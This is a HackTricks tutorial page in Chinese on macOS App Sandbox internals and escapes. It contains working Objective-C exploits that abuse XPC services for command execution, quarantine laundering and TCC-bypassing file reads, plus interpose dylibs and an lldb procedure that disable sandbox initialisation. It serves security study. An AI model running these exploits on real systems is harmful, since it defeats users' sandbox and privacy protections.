# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox 加载过程

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>图片来源：<a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

在上图中，可以看到运行带有 entitlement **`com.apple.security.app-sandbox`** 的应用程序时，**sandbox 的加载过程**。

编译器会将 `/usr/lib/libSystem.B.dylib` 链接到二进制文件。

接着，**`libSystem.B`** 会调用多个函数，直到 **`xpc_pipe_routine`** 将应用程序的 entitlements 发送给 **`securityd`**。Securityd 会检查该进程是否应被隔离在 sandbox 中；如果是，就会将其隔离。\
最后，通过调用 **`__sandbox_ms`** 激活 sandbox，而它会调用 **`__mac_syscall`**。<sup>[[1]](#references)[[3]](#references)</sup>

## 可能的 Bypass 方法

### Bypass quarantine attribute

**由 sandboxed 进程创建的文件**会被附加 **quarantine attribute**，以防止 sandbox escape：如果你放入一个新应用并尝试启动它，quarantine flag 会阻止它。因此，**如果你能放入一个不带 quarantine attribute 的文件或文件夹，就能逃出 App Sandbox**——只要放入一个 `.app` bundle，再用 `open` 启动它即可，因为新启动的进程由 LaunchServices 运行，而不在你的 sandbox 中。

要可靠地创建一个**不带 quarantine 的文件**，可以让**另一个进程替你创建文件**。正如 Mickey Jin 在 [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) 中所述，**App Sandbox** 会给放入的文件添加 quarantine，但在 Service Sandbox 中运行的 **XPC services 不会**。因此，多个无需身份验证的 XPC services 可被用作“quarantine laundering”原语：<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) 和 **CVE-2023-32414** (`ArchiveService`)：将 sandboxed app 传入的 archive 解压到指定位置，**且不会将 quarantine xattr 传播到解压后的内容**。
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`)：`submitSignpostDataWithConfig:` 中的路径遍历漏洞可创建**任意不带 quarantine 的目录**，足以在容器外构建完整的 `.app` bundle 结构。
- **CVE-2024-27864** (`diskimagescontroller.xpc`)：挂载带 quarantine 的 DMG，**但不会给生成的设备添加 quarantine**，因此可以启动挂载卷上的应用。

> [!TIP]
> 解压操作通常会**丢弃可执行权限位**。CVE-2023-27944 使用的 workaround 是，将指向现有已签名系统二进制文件（例如 `/System/Library/CoreServices/Automator Application Stub`）的**符号链接**设为 bundle 的主可执行文件，这样无需给放入的文件添加 `+x` 权限也能启动。

> [!CAUTION]
> 这之所以有效，是因为检查依据是**被启动项目上的 flag**：*"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*，之后才会 *"it's handed over to Gatekeeper for full 'first run' security checks"*（[Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)）。你启动的 bundle 上没有 flag，就不会经过 Gatekeeper 检查——这正是上述 CVE 提供的原语。<sup>[[5]](#references)</sup>
>
> 请注意，如果某个 `.app` bundle 已获准运行（它带有一个设置了“authorized to run” flag 的 quarantine xattr），你也可以滥用它……但现在你无法写入 **`.app`** bundle，除非拥有某些特权 TCC 权限（而在 sandbox 中你不会有这些权限）。

### 滥用 Open 功能

在[**Word sandbox bypass 的最后几个示例**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)中，可以看到如何滥用 **`open`** CLI 功能来 bypass sandbox。

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

即使某个应用程序**本应处于 sandbox 中**（`com.apple.security.app-sandbox`），如果它是**从 LaunchAgent**（例如 `~/Library/LaunchAgents`）启动的，也可以 bypass sandbox。\
如[**这篇文章**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)所述，如果你想通过 sandboxed 应用获得 persistence，可以让它作为 LaunchAgent 自动运行，并尝试通过 DyLib 环境变量注入恶意代码。<sup>[[6]](#references)</sup>

### 滥用 Auto Start Locations

如果 sandboxed 进程可以在某个位置**写入**，而稍后有一个**非 sandboxed 应用会在该位置运行二进制文件**，那么它只需**将二进制文件放在那里**就能逃出 sandbox。`~/Library/LaunchAgents` 或 `/System/Library/LaunchDaemons` 是此类位置的典型示例。

你甚至可能需要**两个步骤**：先让一个具有**更宽松 sandbox**（`file-read*`、`file-write*`）的进程执行你的代码，再由该代码写入一个之后会在**非 sandbox 环境中执行**的位置。

查看此页面了解 **Auto Start locations**：

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### 滥用其他进程

如果你能从该 sandboxed 进程**攻陷其他进程**，而那些进程运行在限制较少的 sandbox（或完全没有 sandbox）中，就能逃到它们的 sandbox 中：

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### 可用的系统和用户 Mach services

Sandbox 还允许通过 `application.sb` profile 中定义的 XPC 与特定 **Mach services** 通信。如果你能**滥用**其中一项 service，就可能**逃出 sandbox**。

如[这篇 writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)所述，Mach services 的信息存储在 `/System/Library/xpc/launchd.plist` 中。搜索该文件中的 `<string>System</string>` 和 `<string>User</string>`，即可找到所有 System 和 User Mach services。<sup>[[4]](#references)</sup>

此外，还可以调用 `bootstrap_look_up` 来检查 sandboxed 应用是否能访问某个 Mach service：

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### 可用的 PID Mach services

这些 Mach services 最早在[这篇文章](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)中被用于逃逸 sandbox。<sup>[[4]](#references)</sup> 当时，应用及其 framework **所需的所有 XPC services** 都能在应用的 PID domain 中看到（这些 Mach Services 的 `ServiceType` 为 `Application`）。

要**联系 PID Domain XPC service**，只需在应用中通过类似下面的一行代码注册它：

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

此外，可以在 `System/Library/xpc/launchd.plist` 中搜索 `<string>Application</string>`，以找到所有 **Application** Mach services。

另一种查找有效 xpc services 的方法是检查以下目录中的服务：

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Several examples abusing this technique can be found in the [**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)，不过下面是一些总结示例。<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

该服务通过始终返回 `YES` 来允许所有 XPC 连接，而 `runTask:arguments:withReply:` 方法会使用任意参数执行任意命令。

这个 exploit“简单到只需”：

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

此 XPC 服务始终返回 `YES`，因此允许所有客户端调用；`createZipAtPath:hourThreshold:withReply:` 方法接受文件夹路径，并将其压缩为 ZIP 文件。

因此，可以生成伪造的应用文件夹结构，将其压缩，再解压并执行，从而逃逸 sandbox，因为新文件不会带有 quarantine attribute。

利用方式如下：

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

此 XPC 服务可通过 `extendAccessToURL:completion:` 方法，向 XPC 客户端授予对任意 URL 的读写权限，而该方法接受任何连接。由于此 XPC 服务拥有 FDA 权限，因此可以滥用这些权限，完全绕过 TCC。

利用方法如下：

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### 静态编译与动态链接

[**这项研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) 发现了 2 种绕过 Sandbox 的方法。因为 Sandbox 是在加载 **libSystem** 库时从 userland 应用的。如果二进制文件能够避免加载该库，就永远不会受到 Sandbox 限制：<sup>[[2]](#references)</sup>

- 如果二进制文件是**完全静态编译**的，就可以避免加载该库。
- 如果**二进制文件不需要加载任何库**（因为链接器也位于 libSystem 中），它就不需要加载 libSystem。

### Shellcodes

请注意，ARM64 上的 **shellcodes** 甚至也需要链接到 `libSystem.dylib` 中：

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### 未继承的限制

如 **[这篇 writeup 的 bonus](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** 中所述，类似这样的 sandbox 限制：<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

例如，新进程执行以下操作即可 bypass：

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

不过，当然，这个新进程不会继承父进程的 entitlements 或权限。

### 使用 spawn attributes 替换继承的沙箱（较旧版本的 macOS）

普通的 `posix_spawn()` 子进程会继承父进程的沙箱。在 2026 年 2 月修复之前的 macOS 版本中，处于沙箱中的父进程可以通过 `posix_spawnattr_setmacpolicyinfo_np()`，向 `Sandbox` MAC 策略传入一个**内置配置文件名称**。随后，子进程会获得该配置文件，而不是继承父进程的限制。内置的 `no-network` 配置文件仍允许访问用户的主目录，因此像 `/bin/bash` 这样的子进程可以操作 App Sandbox 父进程无法访问的文件。这与 [LaunchServices `open` 路径](#not-inherited-restrictions)不同，后者由独立服务启动进程。有关通用输入路径，请参见 [MACF 策略专用 spawn attributes](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input)。<sup>[[7]](#references)</sup>

要在**受影响且隔离的 macOS 主机**上测试这一边界，可在应用容器之外的主目录中创建一个无害的 canary 文件。先从已处于沙箱中的父进程使用普通 `posix_spawn()` 启动同一个子进程，再使用选择 `no-network` 的 Sandbox spawn-attribute blob 启动它；比较子进程能否读取该 canary。以下代码片段使用了 Siguza 的[示例启动器](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)中私有的 `sandbox_spawnattr_t` 定义和函数声明。将其集成到测试应用时，请添加常规的错误处理。<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

成功返回 `posix_spawn()` 并不能证明已逃逸：应将**子进程的有效文件访问权限**与普通子进程基线进行比较。已打补丁的系统会拒绝已处于 sandbox 中的调用者请求内置配置文件，除非调用者拥有私有的 `com.apple.private.security.sandbox-spawnattrs` entitlement。不要将这种历史行为视为当前可用的绕过方式。<sup>[[7]](#references)</sup>

### 权限声明

请注意，即使应用拥有特定的 **entitlement**，某些**操作**也可能被 **sandbox 允许**，例如：

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

有关 **Interposting** 的更多信息，请查看：


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` 以阻止 sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Interpost `__mac_syscall` 以阻止沙盒

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### 使用 lldb 调试并绕过 Sandbox

让我们编译一个应该受到 Sandbox 限制的应用程序：

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

然后编译应用：

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> 应用会尝试**读取**文件 **`~/Desktop/del.txt`**，但 **Sandbox 不允许这样做**。\
> 在那里创建一个文件，因为绕过 Sandbox 后，应用就能读取它：
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

让我们调试应用程序，看看 Sandbox 何时加载：

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **即使绕过 Sandbox，TCC** 仍会询问用户是否允许该进程读取桌面中的文件

## References

- [1] [Jonathan Levin - The Apple Sandbox: Deeper into the Quagmire (HITB GSEC 2016 slides)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - The Apple Sandbox: Deeper into the Quagmire (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass w/ Telegram using DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Escaping the Apple Sandbox by Spawning an Executable](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - sandbox-exec but for builtin profiles](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)

{{#include ../../../../../banners/hacktricks-training.md}}
